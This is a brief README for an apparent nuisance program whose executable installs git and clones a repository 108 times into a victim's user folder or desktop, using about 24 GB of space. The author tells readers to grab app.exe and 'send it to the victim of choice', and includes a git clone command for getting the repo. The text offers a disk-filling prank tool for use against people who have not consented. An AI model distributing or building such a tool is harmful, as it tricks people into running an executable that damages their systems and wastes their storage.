#### installs git if needed and clones [this](https://github.com/zaherbaveaur/hi) repo 108 times in the user folder, costing the victim *24 GB* of space

## Desktop
instead of creating the files in their user folder, it creates them on the desktop so they can watch the chaos unfold

## Installation
for those of you that are stupid just go into the *regular* or *desktop* folders in the repo and grab the app.exe file and send it to the victim of choice

or if you want the whole repo just clone it by typing
```
cd ~
git clone https://github.com/zaherbaveaur/hi-spam
```
into powershell
